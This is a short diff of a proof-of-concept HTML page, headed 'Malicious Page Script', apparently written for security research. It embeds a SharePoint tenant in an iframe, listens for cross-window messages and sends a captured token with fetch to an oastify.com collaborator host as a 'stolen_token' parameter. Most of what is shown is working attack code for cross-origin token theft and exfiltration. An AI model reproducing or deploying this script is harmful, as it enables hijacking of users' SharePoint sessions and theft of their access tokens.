@@ -1,4 +1,8 @@
-// Malicious Page Script
+<html>
+    <h1>POC</h1>
+</html>
+<script>
+    // Malicious Page Script
 const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
 const targetWindow = document.getElementById("sharepoint-frame").contentWindow;
 const exploitId = "HACKER_ID";
@@ -29,3 +33,5 @@ window.addEventListener("message", (event) => {
         fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
     }
 });
+
+</script>
